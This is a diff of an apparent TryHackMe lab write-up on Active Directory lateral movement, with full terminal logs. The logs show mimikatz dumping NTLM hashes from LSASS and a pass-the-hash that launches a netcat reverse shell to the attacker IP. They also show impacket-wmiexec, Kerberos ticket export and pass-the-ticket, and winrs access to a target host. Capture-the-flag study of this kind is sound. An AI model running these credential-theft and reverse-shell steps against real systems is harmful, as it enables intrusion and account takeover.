@@ -49,7 +49,7 @@ TGT the `Overpass-the-Hash` way.
 As a result of extracting credentials from a host where we have attained administrative privileges, we might get 
 clear-text passwords, or hashes that can be easily cracked.
 
-## NTLM hash (NTHash)
+### NTLM hash (NTHash)
 
 These hashes can be obtained by dumping the SAM database or using `mimikatz`. They are also stored on domain 
 controllers in the `NTDS` file. These are the hashes that can be used to `pass-the-hash`.
@@ -72,7 +72,7 @@ Cracking:
     john --format=nt hash.txt
     hashcat -m 1000 -a 3 hash.txt
 
-## NTLMv1 (Net-NTLMv1) hash
+### NTLMv1 (Net-NTLMv1) hash
 
 The NTLM protocol uses the NTHash in a challenge/response between a server and a client. The v1 of the protocol uses 
 both the NT and LM hash, depending on configuration and on what is available. 
@@ -231,7 +231,7 @@ To receive the reverse shell, run a listener on the attack machine:
 
     nc -nlvp 5556
 
-## Get the flag
+## Flags
 
 The given credentials will grant t2 administrative access to THMJMP2, allowing for the use of mimikatz to dump the 
 authentication material needed for any of the applied techniques. Both mimikatz and psexec64 are available at 
@@ -244,36 +244,228 @@ Using an `ssh` session:
 
 Start `mimikatz`:  
 
-    powershell
-    cd C:/tools
+    za\t2_felicia.dean@THMJMP2 C:\Users\t2_felicia.dean>powershell                  
+    Windows PowerShell                                                              
+    Copyright (C) 2016 Microsoft Corporation. All rights reserved.                  
+    
+    PS C:\Users\t2_felicia.dean> cd C:/Tools 
 
-    mimikatz.exe
+    PS C:\Tools> ./mimikatz.exe                                                     
+
+      .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53                    
+     .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                                     
+     ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )        
+     ## \ / ##       > https://blog.gentilkiwi.com/mimikatz                         
+     '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )       
+      '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/       
+
 
 Elevate privileges:
 
-    mimikatz # privilege::debug
-    mimikatz # token::elevate
+    mimikatz # privilege::debug                                                     
+    Privilege '20' OK
+
+```text
+mimikatz # token::elevate                                                       
+Token Id  : 0                                                                   
+User name :                                                                     
+SID name  : NT AUTHORITY\SYSTEM                                                 
+
+504     {0;000003e7} 1 D 16943          NT AUTHORITY\SYSTEM     S-1-5-18        
+(04g,21p)       Primary                                                         
+ -> Impersonated !                                                              
+ * Process Token : {0;0012e3cf} 0 D 1265501     ZA\t2_felicia.dean      S-1-5-21
+-3330634377-1326264276-632209373-4605   (12g,24p)       Primary                 
+ * Thread Token  : {0;000003e7} 1 D 1345000     NT AUTHORITY\SYSTEM     S-1-5-18
+(04g,21p)       Impersonation (Delegation) 
+```
 
 Dump any cached NTLM hashes from the LSASS process memory:
 
-    mimikatz # sekurlsa::msv
+```text
+mimikatz # sekurlsa::msv
+
+...
+Authentication Id : 0 ; 398808 (00000000:000615d8)                              
+Session           : RemoteInteractive from 3                                    
+User Name         : t1_toby.beck5                                               
+Domain            : ZA                                                          
+Logon Server      : THMDC                                                       
+Logon Time        : 10/14/2022 9:28:50 PM                                       
+SID               : S-1-5-21-3330634377-1326264276-632209373-4620               
+        msv :                                                                   
+         [00000003] Primary                                                     
+         * Username : t1_toby.beck5                                             
+         * Domain   : ZA                                                        
+         * NTLM     : 533f1bd576caa912bdb9da284bbc60fe                          
+         * SHA1     : 8a65216442debb62a3258eea4fbcbadea40ccc38                  
+         * DPAPI    : 0537b9105954f5d1d1bc2f1763d86fd6 
+...
+```
+
+### Inject with mimikatz
 
 Using an ssh session mimics a reverse shell, but we can not use `/run:"cmd.exe"` because we can not spawn a sub-shell.
+Instead, `sekurlsa::pth` is going to inject `t1_toby.beck`'s NTLM hash into the cmd.exe reverse shell back to Kali:
 
-`sekurlsa::pth` is going to inject t1_toby.beck's NTLM hash into the cmd.exe reverse shell back to Kali:
-
-    mimikatz # token::revert
-    sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1bd576caa912bdb9da284bbc60fe /run:"C:\tools\nc64.exe -e cmd.exe <vpn ip attack machine> 6666
-
-Start a listener on the attack machine:
+First, start a listener on the attack machine:
 
     sudo nc -lnvp 6666
+
+Inject:
+
+```text
+mimikatz # token::revert                                                        
+ * Process Token : {0;0012e3cf} 0 D 1265501     ZA\t2_felicia.dean      S-1-5-21
+-3330634377-1326264276-632209373-4605   (12g,24p)       Primary                 
+ * Thread Token  : no token                                                                             
+
+mimikatz # sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1
+bd576caa912bdb9da284bbc60fe /run:"C:\tools\nc64.exe -e cmd.exe 10.50.65.95 6666 
+user    : t1_toby.beck                                                          
+domain  : za.tryhackme.com                                                      
+program : C:\tools\nc64.exe -e cmd.exe 10.50.65.95 6666                         
+impers. : no                                                                    
+NTLM    : 533f1bd576caa912bdb9da284bbc60fe                                      
+  |  PID  9372                                                                  
+  |  TID  9424                                                                  
+  |  LSA Process is now R/W                                                     
+  |  LUID 0 ; 1632307 (00000000:0018e833)                                       
+  \_ msv1_0   - data copy @ 0000015AF0327BF0 : OK !                             
+  \_ kerberos - data copy @ 0000015AF1138A28                                    
+   \_ aes256_hmac       -> null                                                 
+   \_ aes128_hmac       -> null                                                 
+   \_ rc4_hmac_nt       OK                                                      
+   \_ rc4_hmac_old      OK                                                      
+   \_ rc4_md4           OK                                                      
+   \_ rc4_hmac_nt_exp   OK                                                      
+   \_ rc4_hmac_old_exp  OK                                                      
+   \_ *Password replace @ 0000015AF112E8C8 (32) -> null   
+```
+
+On the attack machine the shell is received:
+
+```text
+$ sudo nc -lnvp 6666
+[sudo] password for nina: 
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::6666
+Ncat: Listening on 0.0.0.0:6666
+Ncat: Connection from 10.200.71.249.
+Ncat: Connection from 10.200.71.249:50997.
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+```
 
 Having a command prompt with his credentials loaded, use `winrs` to connect to a command prompt on THMIIS. 
 Since t1_toby.beck's credentials are already injected in your session as a result of the attacks, you can use `winrs` 
 without specifying any credentials, and it will use the ones available to the current session:
 
+    C:\Windows\system32>winrs.exe -r:THMIIS.za.tryhackme.com cmd
     winrs.exe -r:THMIIS.za.tryhackme.com cmd
+    Microsoft Windows [Version 10.0.17763.1098]
+    (c) 2018 Microsoft Corporation. All rights reserved.
 
 The flag is on t1_toby.beck's desktop on THMIIS. 
 
+    C:\Users\t1_toby.beck>cd Desktop
+    cd Desktop
+
+    C:\Users\t1_toby.beck\Desktop>dir
+    dir
+     Volume in drive C is Windows
+     Volume Serial Number is 1634-22A9
+    
+     Directory of C:\Users\t1_toby.beck\Desktop
+    
+    06/17/2022  08:01 PM    <DIR>          .
+    06/17/2022  08:01 PM    <DIR>          ..
+    06/15/2022  11:29 PM            58,368 Flag.exe
+                   1 File(s)         58,368 bytes
+                   2 Dir(s)  46,545,506,304 bytes free
+    
+    C:\Users\t1_toby.beck\Desktop>Flag.exe
+
+### Impacket from kali
+
+```text
+$ impacket-wmiexec -hashes ':533f1bd576caa912bdb9da284bbc60fe' 'za.tryhackme.com/t1_toby.beck@thmiis.za.tryhackme.com'
+Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+za\t1_toby.beck
+
+C:\>hostname
+THMIIS
+
+C:\>
+```
+
+## Kerberos
+
+Dump:
+
+    mimikatz # sekurlsa::tickets /export 
+    ...
+
+In another ssh session:
+
+    za\t2_felicia.dean@THMJMP2 C:\tools>dir                                         
+     Volume in drive C has no label.                                                
+     Volume Serial Number is F4B0-FCB9                                              
+    
+     Directory of C:\tools                                                          
+    
+    ...                                                    
+    10/14/2022  10:19 PM             1,685 [0;1d7a0d]-0-0-40a10000-t1_toby.beck@HTTP-THMIIS.za.tryhackme.com.kirbi                                                  
+    10/14/2022  10:19 PM             1,537 [0;1d7a0d]-2-0-40e10000-t1_toby.beck@krbtgt-ZA.TRYHACKME.COM.kirbi                                                       
+    ...                          
+
+Back to mimikatz:
+
+```text
+mimikatz # kerberos::ptt [0;1d7a0d]-2-0-40e10000-t1_toby.beck@krbtgt-ZA.TRYHACKME.COM.kirbi                                                                     
+
+* File: '[0;1d7a0d]-2-0-40e10000-t1_toby.beck@krbtgt-ZA.TRYHACKME.COM.kirbi': OK
+```
+
+Leave mimikatz and check:
+
+    mimikatz # exit                                                                 
+    Bye!                                                                            
+    PS C:\Tools> klist                                                              
+    
+    Current LogonId is 0:0x12e3cf                                                   
+    
+    Cached Tickets: (1)                                                             
+    
+    #0>     Client: t1_toby.beck @ ZA.TRYHACKME.COM                                 
+            Server: krbtgt/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM                      
+            KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96                    
+            Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent nam
+    e_canonicalize                                                                  
+            Start Time: 10/14/2022 22:00:50 (local)                                 
+            End Time:   10/15/2022 8:00:50 (local)                                  
+            Renew Time: 10/21/2022 22:00:50 (local)                                 
+            Session Key Type: RSADSI RC4-HMAC(NT)                                   
+            Cache Flags: 0x1 -> PRIMARY                                             
+            Kdc Called:        
+
+Using winrs.exe:
+
+    PS C:\Tools> winrs.exe -r:THMIIS.za.tryhackme.com cmd                           
+    Microsoft Windows [Version 10.0.17763.1098]                                     
+    (c) 2018 Microsoft Corporation. All rights reserved.                            
+    
+    C:\Users\t1_toby.beck>whoami                                                    
+    whoami                                                                          
+    za\t1_toby.beck                                                                 
+    
+    C:\Users\t1_toby.beck>hostname                                                  
+    hostname                                                                        
+    THMIIS                                                                          
+    
+    C:\Users\t1_toby.beck>
